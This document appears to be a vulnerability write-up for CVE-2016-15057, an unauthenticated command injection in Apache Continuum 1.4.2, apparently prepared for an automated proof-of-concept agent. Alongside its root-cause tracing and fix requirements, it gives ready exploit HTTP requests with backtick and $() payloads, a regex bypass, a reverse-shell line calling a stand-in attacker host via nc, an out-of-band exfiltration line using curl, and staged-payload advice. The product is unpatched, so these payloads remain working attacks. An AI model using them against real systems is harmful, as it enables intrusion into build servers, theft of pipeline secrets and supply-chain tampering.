# Vulnerability Analysis: CVE-2016-15057

## CVE ID
CVE-2016-15057

## Affected Software
- **Name**: Apache Continuum 1.4.2 (and all prior versions)
- **Language**: Java
- **Type**: Continuous Integration Server

---

## Root Cause

### Summary
OS command injection via unsanitized `installation.varValue` POST parameter passed to shell command execution. The injection occurs **during Struts2 input validation** (in a custom validator), which executes **before the authorization interceptor**. This makes the vulnerability exploitable by **unauthenticated remote attackers**.

### Detailed Root Cause

The vulnerability has two compounding flaws:

**Flaw 1: Command Injection (CWE-77)**
User-supplied path values from the `installation.varValue` parameter are concatenated directly into shell command executable paths and executed via `plexus-utils Commandline` → `CommandLineUtils.executeCommandLine()`. On Linux, plexus-utils wraps command execution in `/bin/sh -c`, enabling shell metacharacter interpretation (backticks, `$()`, etc.).

**Flaw 2: Pre-Auth Execution via Interceptor Ordering (CWE-863)**
The Struts2 interceptor stack `configuredContinuumStack` orders interceptors as:
1. `redbackForceAdminUser` (check admin exists)
2. `redbackAutoLogin` (auto-login from cookie)
3. **`defaultStack`** (includes `validation` → triggers `InstallationValidator` → **executes shell command**)
4. `redbackSecureActions` (**authorization check** — runs AFTER validation)

The `InstallationValidator` custom validator calls `installationService.getExecutorConfiguratorVersion(varValue, ...)` which constructs and executes a shell command with the tainted `varValue`. Since this happens inside `defaultStack` (step 3), the shell command is **executed before the authorization check** (step 4) is reached. If validation adds field errors (it will — either from regex or version-check failure), the `workflow` interceptor short-circuits the chain and the auth check is **never reached**.

Additionally, the Struts2 regex validator for `varValue`:
```
(?:[~A-Za-z0-9_.:=${}\\/\-+]|\s|[()])*
```
Does **not** use `short-circuit="true"`, so even if the regex rejects backtick characters, the `installationValidator` still runs and executes the command. Furthermore, `$()` command substitution syntax **passes the regex** since `$`, `(`, `)` are all in the allowed character set.

---

## Vulnerable File(s) and Function(s)

### Primary Vulnerability Chain

| # | Component | File | Function/Method | Line(s) | Role |
|---|-----------|------|-----------------|---------|------|
| 1 | **Struts Validation** | `continuum-webapp/.../validator/InstallationValidator.java` | `validate()` | 53-89, esp. **79** | Calls `getExecutorConfiguratorVersion(varValue, ...)` — triggers command execution during validation |
| 2 | **Installation Service** | `continuum-commons/.../installation/DefaultInstallationService.java` | `getExecutorConfiguratorVersion()` | 404-466, esp. **423, 437, 441** | Constructs executable path from user input, calls `CommandLineUtils.executeCommandLine()` |
| 3 | **Installation Service** | `continuum-commons/.../installation/DefaultInstallationService.java` | `getJavaHomeInformations()` | 343-373, esp. **348, 350, 354** | Constructs `javaHome + "/bin/java"` and executes via `CommandLineUtils` |
| 4 | **Struts Action** | `continuum-webapp/.../action/admin/InstallationAction.java` | `save()` | 126-171 | Entry point for POST; passes `installation` object to service without validation of `varValue` |
| 5 | **Shell Helper** | `continuum-api/.../utils/shell/DefaultShellCommandHelper.java` | `executeShellCommand()` | 55-67, 116-148 | Low-level command execution; no sanitization |

### Interceptor Stack (Execution Order)
**File**: `continuum-webapp/src/main/resources/struts.xml`, lines 85-104

```
configuredContinuumStack:
  1. redbackEnvironmentChecker
  2. redbackForceAdminUser        ← checks admin user exists
  3. redbackAutoLogin             ← auto-login (does not require auth)
  4. defaultStack                 ← includes VALIDATION → COMMAND INJECTION HERE
  5. redbackSecureActions         ← AUTHORIZATION CHECK (never reached)
  6. redbackPolicyEnforcement
  7. continuumConfigurationCheck
  8-10. tokenSession, validation (2nd pass), workflow (2nd pass)
```

### Validation Configuration
**File**: `continuum-webapp/src/main/resources/.../InstallationAction-saveInstallation-validation.xml`

Validators for `installation.varValue`:
1. `requiredstring` — checks non-empty
2. `regex` — `(?:[~A-Za-z0-9_.:=${}\\/\-+]|\s|[()])*` (NO short-circuit)
3. `installationValidator` — **calls getExecutorConfiguratorVersion() → SHELL COMMAND EXECUTION**

---

## Triggering Input

### Minimal PoC Request (Unauthenticated)

```http
POST /continuum/saveInstallation.action HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

installation.name=pwned&installation.type=jdk&installation.varValue=%60id%60
```

Where `%60` = backtick (`` ` ``).

### Alternative Payload (Passes Regex Validation)

```http
POST /continuum/saveInstallation.action HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

installation.name=pwned&installation.type=jdk&installation.varValue=$(id)
```

`$(id)` passes the regex validator since `$`, `(`, `)` are all allowed characters.

### Supported Installation Types for Immediate Execution

| Type | ExecutorConfigurator | Command Constructed | Immediate Exec? |
|------|---------------------|---------------------|-----------------|
| `jdk` | `java` in `bin/`, versionArg: `-version` | `<varValue>/bin/java -version` | **YES** |
| `maven2` | `mvn` in `bin/`, versionArg: `-v` | `<varValue>/bin/mvn -v` | **YES** |
| `maven1` | `maven` in `bin/`, versionArg: `-v` | `<varValue>/bin/maven -v` | **YES** |
| `ant` | `ant` in `bin/`, versionArg: `-version` | `<varValue>/bin/ant -version` | **YES** |
| `envvar` | null (no configurator) | N/A | **NO** (stored only, executed later during builds) |

### What Happens on the Server

For `installation.type=jdk` and `installation.varValue=`id``:
1. `getExecutorConfiguratorVersion()` constructs executable: `` `id`/bin/java ``
2. `Commandline.setExecutable()` sets this as the command
3. `CommandLineUtils.executeCommandLine()` invokes plexus-utils
4. plexus-utils on Linux wraps in: `/bin/sh -c '"`id`/bin/java" -version'`
5. Shell processes backtick substitution → executes `id`
6. `id` output is substituted into the path, command fails (non-zero exit)
7. Exception is caught, field error added, INPUT result returned
8. **But `id` was already executed**

### Blind vs. Output

The injection is **blind** — command output is not directly returned in the HTTP response. The output goes to the `StreamConsumer` which is captured in a list but only used for version information display. Errors are caught and the error message may contain partial output.

For data exfiltration, use:
- Out-of-band (OOB): DNS exfiltration, HTTP callback
- Reverse shell: `nc ATTACKER_IP PORT -e /bin/sh`
- File write: `id > /tmp/pwned`
- Time-based: `sleep 5` (verify by response delay)

---

## Attack Scenario

### Step-by-Step Exploitation

1. **Prerequisite**: Apache Continuum 1.4.2 is running on `target:8080`. The initial setup wizard has been completed (admin user created). No authentication is required for the attacker.

2. **Verify Target**: Send GET to `/continuum/about.action` — response contains version string "1.4.2"

3. **Inject Command**: Send POST to `/continuum/saveInstallation.action`:
   ```
   installation.name=test123
   installation.type=jdk
   installation.varValue=`COMMAND_HERE`
   ```

4. **Command Executes During Validation**: The `InstallationValidator` calls `getExecutorConfiguratorVersion()` which runs the command via `/bin/sh -c`. Execution happens before the authorization check.

5. **Response**: HTTP 200 with the editInstallation form (INPUT result) showing validation errors. The response does NOT indicate command success/failure directly.

6. **For Reverse Shell**:
   ```
   installation.varValue=`nc ATTACKER_IP 4444 -e /bin/sh`
   ```

7. **For Staged Payload** (Metasploit approach): Use CmdStager to deliver multi-stage payloads via successive injections.

---

## Impact

- **Confidentiality**: HIGH — Full read access to server filesystem, environment variables, credentials
- **Integrity**: HIGH — Arbitrary file write, code modification, backdoor installation
- **Availability**: HIGH — Service disruption, data destruction
- **Scope**: CHANGED — Can pivot to other systems, access CI/CD pipeline secrets, modify build artifacts (supply chain attack)

The attacker achieves **arbitrary OS command execution** as the user running the Continuum process (typically a service account or root in Docker containers).

---

## Authentication Requirements

### Pre-Auth Exploitation (Primary Vector)
**No authentication required.** The command injection occurs during the Struts2 validation phase, which executes before the `redbackSecureActions` authorization interceptor. Any remote attacker with HTTP access to the Continuum web interface can exploit this.

**Only prerequisite**: The Continuum initial setup wizard must have been completed (admin user must exist) — the `redbackForceAdminUser` interceptor redirects to admin creation if no admin exists.

### Authenticated Exploitation (Secondary Vector — envvar type)
For the `envvar` installation type, the validator does NOT trigger immediate command execution (no ExecutorConfigurator). The tainted value is stored and executed later during builds. This path requires:
- Authentication as a user with `continuum-manage-installations` role
- Credentials: Set during initial setup wizard (no default credentials)
- Login endpoint: `/continuum/security/login.action`
- Session: Cookie-based (`JSESSIONID`)

---

## Fix Assessment

### No Fix Exists
Apache Continuum is a **retired project**. No patch has been or will be released. JIRA issue CONTINUUM-2769 was filed targeting version 1.5.1, but that version was never released.

### What a Fix Would Need
A proper fix would require:
1. **Input validation**: Whitelist `varValue` to only contain valid filesystem path characters (reject shell metacharacters: `` ` ``, `$`, `(`, `)`, `{`, `}`, `;`, `|`, `&`, `<`, `>`, `'`, `"`, `!`, `\n`)
2. **Interceptor reordering**: Move `redbackSecureActions` BEFORE `defaultStack` in `configuredContinuumStack` so authorization is checked before validation
3. **Safe command execution**: Use `ProcessBuilder` with explicit argument arrays instead of `/bin/sh -c` wrapping. Or upgrade plexus-utils to a version that doesn't use shell wrapping.
4. **Fix regex**: The current regex allows `$`, `(`, `)`, `{`, `}` which enable `$(cmd)` and `${cmd}` injection even if backticks were properly blocked.

### Existing Regex Validation is Insufficient
The regex `(?:[~A-Za-z0-9_.:=${}\\/\-+]|\s|[()])*` in `InstallationAction-saveInstallation-validation.xml`:
- **Allows** `$()` command substitution (passes regex)
- **Does not short-circuit** — even if regex fails (for backticks), `installationValidator` still runs
- **Allows** `${}` parameter expansion

---

## Potential Bypass Vectors

Since there is no fix, "bypass" applies to the existing regex validation:

1. **`$(command)` substitution**: Characters `$`, `(`, `)` are explicitly allowed by the regex. This passes validation cleanly.
2. **No short-circuit**: Even for characters not in the regex (backticks), the `installationValidator` custom validator still runs because `short-circuit="true"` is not set.
3. **Multiple installation types**: All of `jdk`, `maven2`, `maven1`, `ant` trigger immediate execution during validation.

---

## Related Attack Surface

### Same Pattern in Build Executors (Post-Auth, Delayed Execution)

The same unsanitized `varValue` flows to build executors when builds are triggered:

| File | Lines | Pattern |
|------|-------|---------|
| `continuum-core/.../execution/maven/m2/MavenTwoBuildExecutor.java` | 176, 500 | `m2Home + "/bin/" + executable`; `envVars.put(..., builder.getVarValue())` |
| `continuum-core/.../execution/maven/m1/MavenOneBuildExecutor.java` | 125, 148 | `m1Home + "/bin/" + executable`; `envVars.put(...)` |
| `continuum-core/.../execution/ant/AntBuildExecutor.java` | 106, 129 | `antHome + "/bin/" + executable`; `envVars.put(...)` |
| `continuum-core/.../execution/shell/ShellBuildExecutor.java` | 93, 98 | `javaHome` and `builder.getVarValue()` in env vars |
| `continuum-core/.../execution/AbstractBuildExecutor.java` | 342, 376 | `jdk.getVarValue()` directly; `envVars.put(installation.getVarName(), installation.getVarValue())` |

### Build Agent Components (Remote Distributed Builds)

| File | Lines | Pattern |
|------|-------|---------|
| `continuum-buildagent/.../build/execution/maven/m2/MavenTwoBuildExecutor.java` | 132, 414 | Same path concatenation pattern |
| `continuum-buildagent/.../build/execution/maven/m1/MavenOneBuildExecutor.java` | 99, 414 | Same pattern |
| `continuum-buildagent/.../build/execution/ant/AntBuildExecutor.java` | 91, 414 | Same pattern |
| `continuum-buildagent/.../manager/DefaultBuildAgentReleaseManager.java` | 98, 108 | Same pattern |

### Release Management

| File | Lines | Pattern |
|------|-------|---------|
| `continuum-webapp/.../action/ReleasePrepareAction.java` | 321-325 | `m2Home + "/bin/" + executable` |
| `continuum-release/.../phase/AbstractContinuumRunGoalsPhase.java` | 73, 77-80 | `shellCommandHelper.executeGoals()` with unsanitized environments |

### XML-RPC API (Insufficient Validation)

| File | Lines | Pattern |
|------|-------|---------|
| `continuum-xmlrpc/.../server/ContinuumServiceImpl.java` | 2684-2693, 3856 | Regex `(?:[~A-Za-z0-9_.:=${}\\/\-+]|\s|[()])*` — same insufficient regex; path concatenation |

---

## Build System

### Build Tool
Apache Maven (multi-module POM project)

### RECOMMENDED: Use Pre-Built Binary
**Do NOT build from source.** The project uses Maven 2.x-era dependencies that are extremely difficult to resolve. A pre-built binary is available:

```bash
# Download pre-built binary
wget https://archive.apache.org/dist/continuum/binaries/apache-continuum-1.4.2-bin.tar.gz

# Extract
tar xzf apache-continuum-1.4.2-bin.tar.gz

# Run
cd apache-continuum-1.4.2
bin/continuum console
```

### Build Commands (From Source — NOT RECOMMENDED)
```bash
# Requires Java 7 (JDK 1.7) and Maven 2.x
export JAVA_HOME=/path/to/jdk7
mvn clean install -DskipTests
```

### Dependencies
**Runtime (for pre-built binary):**
- Java JRE/JDK 7 (1.7.x) — **Required**. Does not work with Java 8+ due to removed APIs.
- No other external dependencies (embedded Jetty 8.1.7)

**Build from source (if needed):**
- Java JDK 6 or 7
- Maven 2.0.7+ (Maven 3 may work with compatibility mode)
- All Java dependencies resolved via Maven Central

### Runtime Requirements
- **Port**: 8080 (default, configurable in `continuum-jetty/src/main/conf/jetty.xml`)
- **Context Path**: `/continuum`
- **Storage**: Embedded Derby database (file-based, created automatically)
- **Initial Setup**: Access `http://localhost:8080/continuum/` after first start to create admin user
- **No external services required** (self-contained with embedded Jetty + Derby)

### Docker Lab Recommendations
- **Base Image**: `openjdk:7-jre` or `openjdk:7-jdk` (Java 7 required)
- **Alternative**: `eclipse-temurin:7-jre` if openjdk not available
- Download the pre-built binary into the container
- Expose port 8080
- The initial setup wizard creates admin user on first access
- For automated PoC: complete setup via HTTP POST to create admin user, then exploit

### Key Ports & Endpoints
| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/continuum/` | GET | Main page / setup wizard |
| `/continuum/about.action` | GET | Version check |
| `/continuum/saveInstallation.action` | POST | **Vulnerable endpoint** |
| `/continuum/security/login.action` | POST | Login (for authenticated vectors) |
| `/continuum/xmlrpc` | POST | XML-RPC API (alternative attack surface) |

---

## Summary for PoC Agent

### Simplest Exploitation Path
1. Start Continuum with pre-built binary on Java 7
2. Complete initial setup wizard (create admin user via HTTP — required for `redbackForceAdminUser` to pass)
3. Send unauthenticated POST to `/continuum/saveInstallation.action` with:
   - `installation.name=test`
   - `installation.type=jdk`
   - `installation.varValue=$(COMMAND)` or `installation.varValue=%60COMMAND%60`
4. Command executes blind during validation phase
5. Verify via out-of-band callback or file creation

### Verification Strategy
- **Time-based**: Inject `$(sleep 5)` and measure response time
- **File-based**: Inject `` `id > /tmp/pwned` `` and check file in container
- **OOB**: Inject `$(curl http://ATTACKER/$(id))` for callback with output
